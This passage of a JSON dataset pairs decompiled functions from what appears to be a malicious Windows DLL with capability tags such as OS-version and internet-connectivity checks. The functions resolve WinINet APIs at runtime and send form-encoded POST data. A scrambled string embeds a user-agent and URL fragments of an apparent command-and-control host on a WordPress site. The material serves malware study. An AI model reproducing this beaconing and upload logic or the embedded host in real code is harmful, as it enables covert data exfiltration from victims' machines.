= uStack128;\n            if (iVar5 < 0) {\ncode_r0x000180068f30:\n                if (*(arg1 + 0x69) == '\\0') {\n                    fcn.180067950(auStack192);\n                    fcn.1800add8c(auStack192, 0x18011f940);\n                }\n                else {\n                    fcn.18000de50(arg2, arg1 + 0x20);\n                    if (0xf < uVar8) {\n                        iVar3 = CONCAT44(stack0xffffffffffffff94, var_69h._1_4_);\n                        iVar6 = iVar3;\n                        if ((0xfff < uVar8 + 1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U))\n                        goto code_r0x000180069046;\n                        fcn.18008fb24(iVar6);\n                    }\n                    if (_auStack120 < 0x10) goto code_r0x000180068f0d;\n                    ppppppuVar7 = ppppppuStack144;\n                    if ((_auStack120 + 1 < 0x1000) ||\n                       (ppppppuVar7 = ppppppuStack144[-1],  ppppppuStack144 + (-8 - ppppppuVar7) < 0x20))\n                    goto code_r0x000180068f08;\n                }\ncode_r0x000180069020:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            if (iVar5 < 2) {\n                if (ppppppuVar7 < ppppppuStack152) {\n                    arg2_00 = ppppppuStack152 - ppppppuVar7;\n                    if (uVar8 - uStack96 < arg2_00) {\n                        ppuStack232 = arg2_00;\n                        fcn.180014270(&var_69h + 1, arg2_00, 0, ppppppuVar7);\n                        uVar8 = _auStack88;\n                    }\n                    else {\n                        iVar6 = &var_69h + 1;\n                        if (0xf < uVar8) {\n                            iVar6 = CONCAT44(stack0xffffffffffffff94, var_69h._1_4_);\n                        }\n                        iVar6 = iVar6 + uStack96;\n                        uStack96 = arg2_00 + uStack96;\n                        fcn.1800ade80(iVar6, ppppppuVar7, arg2_00);\n                        *(iVar6 + arg2_00) = 0;\n                        uVar8 = _auStack88;\n                    }\n                }\n                else {\n                    if (0xf < uStack128) {\n                        if (*(arg1 + 0x69) == '\\0') goto code_r0x00018006902c;\n                        fcn.18000de50(arg2, arg1 + 0x20);\n                        if (0xf < uVar8) {\n                            iVar3 = CONCAT44(stack0xffffffffffffff94, var_69h._1_4_);\n                            iVar6 = iVar3;\n                            if ((0xfff < uVar8 + 1) && (iVar6 = *(iVar3 + -8),  0x1f < (iVar3 - iVar6) - 8U))\n                            goto code_r0x000180069046;\n                            fcn.18008fb24(iVar6);\n                        }\n                        if (_auStack120 < 0x10) goto code_r0x000180068f0d;\n                        ppppppuVar7 = ppppppuStack144;\n                        if ((0xfff < _auStack120 + 1) &&\n                           (ppppppuVar7 = ppppppuStack144[-1],  0x1f < ppppppuStack144 + (-8 - ppppppuVar7)))\n                        goto code_r0x000180069020;\n                        goto code_r0x000180068f08;\n                    }\n                    if (_auStack120 - uStack128 < 8) {\n                        ppuStack232 = ppuStack232 & 0xffffffffffffff00;\n                        fcn.18002f2f0(&ppppppuStack144, 8, 0, 8);\n                    }\n                    else {\n                        ppppppuVar7 = &ppppppuStack144;\n                        if (0xf < _auStack120) {\n                            ppppppuVar7 = ppppppuStack144;\n                        }\n                        puVar1 = uStack128 + ppppppuVar7;\n                        uStack128 = uStack128 + 8;\n                        *puVar1 = 0;\n                        *(uVar4 + 8 + ppppppuVar7) = 0;\n                    }\n                }\n            }\n            else {\n                uVar4 = uStack96;\n                if (iVar5 != 3) goto code_r0x000180068f30;\n                for (; uStack96 = uVar4,  puStack160 != arg4; puStack160 = puStack160 + 2) {\n                    if (uVar4 < uVar8) {\n                        uStack96 = uVar4 + 1;\n                        iVar6 = &var_69h + 1;\n                        if (0xf < uVar8) {\n                            iVar6 = CONCAT44(unique0x100004e4, var_69h._1_4_);\n                        }\n                        *(iVar6 + uVar4) = *puStack160;\n                        *(iVar6 + 1 + uVar4) = 0;\n                    }\n                    else {\n                        fcn.180013eb0(&var_69h + 1, 1);\n                    }\n                    uVar8 = _auStack88;\n                    uVar4 = uStack96;\n                }\n            }\n            *(arg1 + 0x70) = puStack160 - puStack200 >> 1;\n        } while (puStack160 != arg4);\n    }\n    *arg2 = var_69h._1_4_;\n    *(arg2 + 4) = stack0xffffffffffffff94;\n    *(arg2 + 1) = var_61h._1_4_;\n    *(arg2 + 0xc) = stack0xffffffffffffff9c;\n    *(arg2 + 2) = uStack96;\n    *(arg2 + 0x14) = uStack96._4_4_;\n    *(arg2 + 3) = auStack88._0_4_;\n    *(arg2 + 0x1c) = stack0xffffffffffffffac;\n    if (0xf < _auStack120) {\n        ppppppuVar7 = ppppppuStack144;\n        if (0xfff < _auStack120 + 1) {\n            ppppppuVar7 = ppppppuStack144[-1];\n            if (0x1f < ppppppuStack144 + (-8 - ppppppuVar7)) {\n                fcn.1800b3528(ppppppuVar7, _auStack120 + 0x28);\ncode_r0x00018006902c:\n                fcn.180067950(auStack192);\n                fcn.1800add8c(auStack192, 0x18011f940);\ncode_r0x000180069046:\n                fcn.1800b3528();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        }\ncode_r0x000180068f08:\n        fcn.18008fb24(ppppppuVar7);\n    }\ncode_r0x000180068f0d:\n    fcn.18008fb00(stack0xffffffffffffffb0 ^ auStack264);\n    return;\n}\n",
        "token_count": 2475
    },
    "18006905": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Variable defined which should be unmapped: var_21h\n// WARNING: Variable defined which should be unmapped: var_31h\n// WARNING: Variable defined which should be unmapped: var_39h\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180069050(int64_t arg1, ulong *arg2, int64_t arg3, int64_t arg4)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    code *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    ushort *puVar9;\n    ulong arg1_00;\n    int64_t iVar10;\n    int64_t iVar11;\n    int64_t *arg2_00;\n    ulong *puVar12;\n    ulong *puVar13;\n    uint64_t uVar14;\n    ulong var_fh;\n    uchar auStack280 [32];\n    int64_t *piStack248;\n    ulong *puStack240;\n    int64_t iStack232;\n    ulong **ppuStack224;\n    ulong *puStack216;\n    uint64_t uStack208;\n    int64_t iStack200;\n    uchar auStack192 [24];\n    ulong uStack168;\n    int64_t iStack160;\n    ulong *puStack152;\n    ulong uStack144;\n    uint64_t var_79h;\n    uint64_t var_71h;\n    ulong var_69h;\n    ulong var_61h;\n    ulong uStack96;\n    uchar auStack88 [7];\n    uint64_t var_49h;\n    ulong var_41h;\n    ulong var_39h;\n    ulong var_31h;\n    ulong var_21h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_1h;\n    \n    uStack168 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack280;\n    stack0xffffffffffffff80 = 0;\n    uStack208 = 7;\n    stack0xffffffffffffff88 = 7;\n    uStack144._0_2_ = 0;\n    uStack96 = 0;\n    uVar14 = 7;\n    _auStack88 = 7;\n    var_69h._1_2_ = 0;\n    puVar12 = arg1 + 0x60;\n    if (*(arg1 + 0x68) == '\\0') {\n        *puVar12 = 0;\n    }\n    piStack248 = piStack248 & 0xffffffffffff0000;\n    puStack216 = puVar12;\n    iStack200 = arg3;\n    iStack160 = arg3;\n    puStack152 = arg2;\n    fcn.180013d50(&uStack144, 8, 0, 8);\n    *(arg1 + 0x70) = 0;\n    do {\n        if (iStack160 == arg4) {\n            *arg2 = CONCAT22(var_69h._3_2_, var_69h._1_2_);\n            *(arg2 + 4) = unique0x100004ca;\n            *(arg2 + 1) = var_61h._1_4_;\n            *(arg2 + 0xc) = unique0x100004d2;\n            uStack96._4_4_ = uStack96 >> 0x20;\n            stack0xffffffffffffffac = _auStack88 >> 0x20;\n            *(arg2 + 2) = uStack96;\n            *(arg2 + 0x14) = uStack96._4_4_;\n            *(arg2 + 3) = auStack88._0_4_;\n            *(arg2 + 0x1c) = stack0xffffffffffffffac;\n            if (7 < unique0x100004be) {\n                iVar10 = CONCAT62(uStack144._2_6_, uStack144);\n                iVar11 = iVar10;\n                if ((0xfff < unique0x100004be * 2 + 2) && (iVar11 = *(iVar10 + -8),  0x1f < (iVar10 - iVar11) - 8U)) {\ncode_r0x00018006949c:\n                    fcn.1800b3528();\n                    pcVar4 = swi(3);\n                    (*pcVar4)();\n                    return;\n                }\ncode_r0x00018006936c:\n                fcn.18008fb24(iVar11);\n            }\ncode_r0x000180069371:\n            fcn.18008fb00(stack0xffffffffffffffb0 ^ auStack280);\n            return;\n        }\n        puVar13 = &uStack144;\n        if (7 < unique0x100004be) {\n            puVar13 = CONCAT62(uStack144._2_6_, uStack144);\n        }\n        iStack232 = puVar13 + unique0x100004b6 * 2;\n        ppuStack224 = &puStack152;\n        piStack248 = &iStack160;\n        puStack240 = puVar13;\n        iVar8 = (**(**(arg1 + 8) + 0x30))(*(arg1 + 8), puVar12, iStack160, arg4);\n        uVar3 = stack0xffffffffffffff80;\n        if (iVar8 < 0) {\ncode_r0x000180069394:\n            if (*(arg1 + 0x6a) == '\\0') goto code_r0x0001800694a8;\n            puVar12 = arg1 + 0x40;\n            arg2[2] = 0;\n            arg2[3] = 0;\n            uVar3 = *(arg1 + 0x50);\n            if (7 < *(arg1 + 0x58)) {\n                puVar12 = *puVar12;\n            }\n            if (uVar3 < 8) {\n                uVar5 = *(puVar12 + 4);\n                uVar6 = *(puVar12 + 1);\n                uVar7 = *(puVar12 + 0xc);\n                *arg2 = *puVar12;\n                *(arg2 + 4) = uVar5;\n                *(arg2 + 1) = uVar6;\n                *(arg2 + 0xc) = uVar7;\n            }\n            else {\n                uStack208 = uVar3 | 7;\n                if (0x7ffffffffffffffe < uStack208) {\n                    uStack208 = 0x7ffffffffffffffe;\n                }\n                arg1_00 = fcn.180011cf0(arg2, uStack208 + 1);\n                *arg2 = arg1_00;\n                fcn.1800ade80(arg1_00, puVar12, uVar3 * 2 + 2);\n            }\n            arg2[2] = uVar3;\n            arg2[3] = uStack208;\n            if (7 < uVar14) {\n                uVar14 = uVar14 * 2 + 2;\n                iVar10 = CONCAT44(stack0xffffffffffffff94, CONCAT22(var_69h._3_2_, var_69h._1_2_));\n                iVar11 = iVar10;\n                if ((0xfff < uVar14) && (iVar11 = *(iVar10 + -8),  0x1f < (iVar10 - iVar11) - 8U)) {\ncode_r0x000180069496:\n                    fcn.1800b3528(iVar11, uVar14 + 0x27);\n                    goto code_r0x00018006949c;\n                }\n                fcn.18008fb24(iVar11);\n            }\n            if (stack0xffffffffffffff88 < 8) goto code_r0x000180069371;\n            uVar14 = stack0xffffffffffffff88 * 2 + 2;\n            iVar11 = CONCAT62(uStack144._2_6_, uStack144);\n            if (0xfff < uVar14) {\n                iVar10 = iVar11 - *(iVar11 + -8);\n                iVar11 = *(iVar11 + -8);\njoined_r0x000180069366:\n                if (0x1f < iVar10 - 8U) {\n                    fcn.1800b3528(iVar11, uVar14 + 0x27);\ncode_r0x0001800694a8:\n                    fcn.180067950(auStack192);\n                    fcn.1800add8c(auStack192, 0x18011f940);\n                    pcVar4 = swi(3);\n                    (*pcVar4)();\n                    return;\n                }\n            }\n            goto code_r0x00018006936c;\n        }\n        if (iVar8 < 2) {\n            if (puVar13 < puStack152) {\n                arg2_00 = puStack152 - puVar13 >> 1;\n                if (uVar14 - uStack96 < arg2_00) {\n                    piStack248 = arg2_00;\n                    fcn.180013690(&var_69h + 1, arg2_00, 0, puVar13);\n                    uVar14 = _auStack88;\n                }\n                else {\n                    iVar10 = uStack96 + arg2_00;\n                    iVar11 = &var_69h + 1;\n                    if (7 < uVar14) {\n                        iVar11 = CONCAT44(stack0xffffffffffffff94, CONCAT22(var_69h._3_2_, var_69h._1_2_));\n                    }\n                    iVar2 = uStack96 * 2;\n                    uStack96 = iVar10;\n                    fcn.1800ade80(iVar11 + iVar2, puVar13, arg2_00 * 2);\n                    *(iVar11 + iVar10 * 2) = 0;\n                    puVar12 = puStack216;\n                    uVar14 = _auStack88;\n                }\n            }\n            else {\n                if (0xf < stack0xffffffffffffff80) {\n                    if (*(arg1 + 0x6a) == '\\0') {\n                        fcn.180067950(auStack192);\n                        fcn.1800add8c(auStack192, 0x18011f940);\n                        pcVar4 = swi(3);\n                        (*pcVar4)();\n                        return;\n                    }\n                    fcn.18000da90(arg2, arg1 + 0x40);\n                    if (7 < uVar14) {\n                        uVar14 = uVar14 * 2 + 2;\n                        iVar10 = CONCAT44(stack0xffffffffffffff94, CONCAT22(var_69h._3_2_, var_69h._1_2_));\n                        iVar11 = iVar10;\n                        if ((0xfff < uVar14) && (iVar11 = *(iVar10 + -8),  0x1f < (iVar10 - iVar11) - 8U))\n                        goto code_r0x000180069496;\n                        fcn.18008fb24(iVar11);\n                    }\n                    if (stack0xffffffffffffff88 < 8) goto code_r0x000180069371;\n                    uVar14 = stack0xffffffffffffff88 * 2 + 2;\n                    iVar11 = CONCAT62(uStack144._2_6_, uStack144);\n                    if (0xfff < uVar14) {\n                        iVar10 = iVar11 - *(iVar11 + -8);\n                        iVar11 = *(iVar11 + -8);\n                        goto joined_r0x000180069366;\n                    }\n                    goto code_r0x00018006936c;\n                }\n                if (stack0xffffffffffffff88 - stack0xffffffffffffff80 < 8) {\n                    piStack248 = piStack248 & 0xffffffffffff0000;\n                    fcn.180013d50(&uStack144, 8, 0, 8);\n                }\n                else {\n                    uVar1 = stack0xffffffffffffff80 + 8;\n                    puVar9 = &uStack144;\n                    if (7 < stack0xffffffffffffff88) {\n                        puVar9 = CONCAT62(uStack144._2_6_, uStack144);\n                    }\n                    puVar13 = puVar9 + stack0xffffffffffffff80;\n                    unique0x10000856 = uVar1;\n                    *puVar13 = 0;\n                    *(puVar9 + uVar3 + 4) = 0;\n                    puVar9[uVar1] = 0;\n                }\n            }\n        }\n        else {\n            if (iVar8 != 3) goto code_r0x000180069394;\n            for (; iStack160 != arg4; iStack160 = iStack160 + 1) {\n                fcn.18000d6f0(&var_69h + 1);\n                uVar14 = _auStack88;\n            }\n        }\n        *(arg1 + 0x70) = iStack160 - iStack200;\n    } while( true );\n}\n",
        "token_count": 2877
    },
    "18006a0b": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18006a0b0(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int32_t iVar4;\n    uchar extraout_XMM0 [16];\n    ulong var_10h;\n    ulong var_20h;\n    uchar auStack312 [32];\n    uint64_t uStack280;\n    uint uStack264;\n    uchar auStack260 [12];\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    ulong uStack184;\n    ulong uStack176;\n    ulong uStack168;\n    ulong uStack160;\n    uint uStack152;\n    uint uStack148;\n    ushort uStack144;\n    uchar uStack142;\n    ulong var_80h;\n    ulong var_bp_70h;\n    ulong var_bp_60h;\n    uchar var_bp_50h [16];\n    ulong var_bp_40h;\n    ulong var_bp_30h;\n    ulong var_20h_2;\n    uint64_t var_10h_2;\n    \n    var_10h_2 = *0x180123080 ^ auStack312;\n    uStack248 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._112_4_;\n    uStack244 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._116_4_;\n    uStack240 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._120_4_;\n    uStack236 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._124_4_;\n    uStack232 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._32_4_;\n    uStack228 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._36_4_;\n    uStack224 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._40_4_;\n    uStack220 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._44_4_;\n    uStack216 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._160_4_;\n    uStack212 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._164_4_;\n    uStack208 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._168_4_;\n    uStack204 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._172_4_;\n    uStack200 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._0_4_;\n    uStack196 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._4_4_;\n    uStack192 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._8_4_;\n    uStack188 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._12_4_;\n    uStack184 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._128_8_;\n    uStack176 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._136_8_;\n    uStack168 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._80_8_;\n    uStack160 = str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                ._88_8_;\n    uStack152 = 0x2f697261;\n    uStack148 = 0x2e373335;\n    uStack144 = 0x3633;\n    uStack142 = 0;\n    if (*0x18012b070 == NULL) {\n        iVar2 = (**0x1800de138)(str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                                ._128_8_, \n                                str._537.36__KHTML__https:__www.gda.dows_NT_10.0__WO6bT7GOg61UixkMjagov.pk_wp_includme_106.0.0.0_SafD6g3gV5oj8UydLViMozilla_5.0__Winlike_Gecko__Chroes_images_wlw_wpW64__AppleWebKit_\n                                ._80_8_, 0x1800fec20);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(0x1800fec20),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b070 = (**0x1800de458)(iVar2);\n        if (*0x18012b070 == NULL) goto code_r0x00018006a38c;\n    }\n    if (*0x18012b030 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fec48);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b030 = (**0x1800de458)(iVar2);\n        if (*0x18012b030 == NULL) goto code_r0x00018006a38c;\n    }\n    if (*0x18012b0b8 == NULL) {\n        iVar2 = (**0x1800de138)(0x1800fec60);\n        if (((iVar2 == 0) && (*0x18012a350 < 0x20)) && (iVar2 = (**0x1800de140)(),  iVar2 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar2;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b0b8 = (**0x1800de458)(iVar2);\n        if (*0x18012b0b8 == NULL) goto code_r0x00018006a38c;\n    }\n    iVar4 = 0;\n    do {\n        iVar1 = (**0x18012b070)(auStack260);\n        if (iVar1 != 0) {\n            uStack280 = uStack280 & 0xffffffff00000000;\n            uVar3 = (**0x18012b030)(&uStack248, 0, 0, 0);\n            uStack264 = 20000;\n            (**0x18012b0b8)(uVar3, 2, &uStack264);\n            uStack264 = 120000;\n            (**0x18012b0b8)(uVar3, 5, &uStack264);\n            uStack264 = 120000;\n            (**0x18012b0b8)(uVar3, 6, &uStack264);\n            goto code_r0x00018006a38c;\n        }\n        (**0x1800de430)(1000);\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 5);\n    (**0x1800de110)();\n    uStack280 = fcn.1800696f0();\n    _var_80h = extraout_XMM0 & 0x0;\n    var_20h_2._0_4_ = 0;\n    _var_bp_70h = _var_80h;\n    _var_bp_60h = _var_80h;\n    var_bp_50h = _var_80h;\n    _var_bp_40h = _var_80h;\n    _var_bp_30h = _var_80h;\n    fcn.180069580(&var_80h, 100, \"%s: %s\", \"Network is unavailable\");\ncode_r0x00018006a38c:\n    fcn.18008fb00(var_10h_2 ^ auStack312);\n    return;\n}\n",
        "token_count": 3542
    },
    "18006a9c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid fcn.18006a9c0(ulong noname_0, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    char *pcVar7;\n    ulong var_7e0h;\n    uchar auStack2328 [32];\n    ulong uStack2296;\n    uint auStack2280 [2];\n    ulong uStack2272;\n    char *pcStack2264;\n    uint uStack2256;\n    uint uStack2252;\n    ulong uStack2248;\n    uint uStack2240;\n    int32_t iStack2236;\n    ulong uStack2232;\n    uint auStack2224 [2];\n    uchar auStack2216 [16];\n    uchar auStack2200 [16];\n    uchar auStack2184 [16];\n    uchar auStack2168 [16];\n    uchar auStack2152 [16];\n    uchar auStack2136 [16];\n    uint uStack2120;\n    char acStack2104 [1968];\n    ulong var_80h;\n    ulong var_bp_70h;\n    ulong var_bp_60h;\n    ulong var_bp_50h;\n    ulong var_bp_40h;\n    uint64_t var_bp_30h;\n    ulong var_20h;\n    \n    var_bp_30h = *0x180123080 ^ auStack2328;\n    fcn.1800ae290(acStack2104, 0, 0x800);\n    uVar6 = 0;\n    auStack2224[0] = 0;\n    if (*0x18012b028 == 0) {\n        iVar3 = (**0x1800de138)(0x1800feea0);\n        if (((iVar3 == 0) && (*0x18012a350 < 0x20)) && (iVar3 = (**0x1800de140)(),  iVar3 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar3;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b028 = (**0x1800de458)(iVar3, \"HttpSendRequestA\");\n        if (*0x18012b028 == 0) goto code_r0x00018006ad66;\n    }\n    if (*0x18012b0b0 == NULL) {\n        iVar3 = (**0x1800de138)(0x1800feec0);\n        if (((iVar3 == 0) && (*0x18012a350 < 0x20)) && (iVar3 = (**0x1800de140)(),  iVar3 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar3;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b0b0 = (**0x1800de458)(iVar3, \"HttpSendRequestExA\");\n        if (*0x18012b0b0 == NULL) goto code_r0x00018006ad66;\n    }\n    if (*0x18012b060 == NULL) {\n        iVar3 = (**0x1800de138)(0x1800feee0);\n        if (((iVar3 == 0) && (*0x18012a350 < 0x20)) && (iVar3 = (**0x1800de140)(),  iVar3 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar3;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b060 = (**0x1800de458)(iVar3, \"HttpAddRequestHeadersA\");\n        if (*0x18012b060 == NULL) goto code_r0x00018006ad66;\n    }\n    if (*0x18012b078 == NULL) {\n        iVar3 = (**0x1800de138)(0x1800feee8);\n        if (((iVar3 == 0) && (*0x18012a350 < 0x20)) && (iVar3 = (**0x1800de140)(),  iVar3 != 0)) {\n            *(*0x18012a350 * 8 + 0x18012a240) = iVar3;\n            *0x18012a350 = *0x18012a350 + 1;\n        }\n        *0x18012b078 = (**0x1800de458)(iVar3, \"InternetWriteFile\");\n        if (*0x18012b078 == NULL) goto code_r0x00018006ad66;\n    }\n    iVar3 = -1;\n    do {\n        pcVar7 = arg2 + 1 + iVar3;\n        iVar3 = iVar3 + 1;\n    } while (*pcVar7 != '\\0');\n    fcn.180069580(acStack2104, 0x800, \n                  \"Content-Type: application/x-www-form-urlencoded\\r\\nConnection: Keep-Alive\\r\\nContent-Length: %d\\r\\n\\r\\n\"\n                  , arg4 + iVar3);\n    iVar2 = (**0x18012b060)(*0x18012a348, acStack2104, 0xffffffff, 0xa0000000);\n    if (iVar2 == 0) {\n        uStack2296 = fcn.1800696f0();\n        pcVar7 = \"HttpAddRequestHeadersA Failed\";\n    }\n    else {\n        auStack2280[0] = 0x38;\n        iVar3 = -1;\n        do {\n            iVar4 = iVar3 + 1;\n            iVar1 = iVar3 + 1;\n            iVar3 = iVar4;\n        } while (acStack2104[iVar1] != '\\0');\n        uStack2256 = iVar4;\n        pcStack2264 = acStack2104;\n        uStack2248 = 0;\n        uStack2272 = 0;\n        uStack2240 = 0;\n        uVar5 = uVar6;\n        if (arg2 != 0) {\n            uVar5 = 0xffffffffffffffff;\n            do {\n                uVar5 = uVar5 + 1;\n            } while (*(arg2 + uVar5) != '\\0');\n        }\n        iStack2236 = uVar5 + arg4;\n        uStack2232 = 0;\n        uStack2296 = 0;\n        uStack2252 = uStack2256;\n        iVar2 = (**0x18012b0b0)(*0x18012a348, auStack2280, 0, 0);\n        if (iVar2 == 0) {\n            uStack2296 = fcn.1800696f0();\n            pcVar7 = \"HttpSendRequestExA Failed\";\n        }\n        else {\n            if (arg2 != 0) {\n                uVar6 = 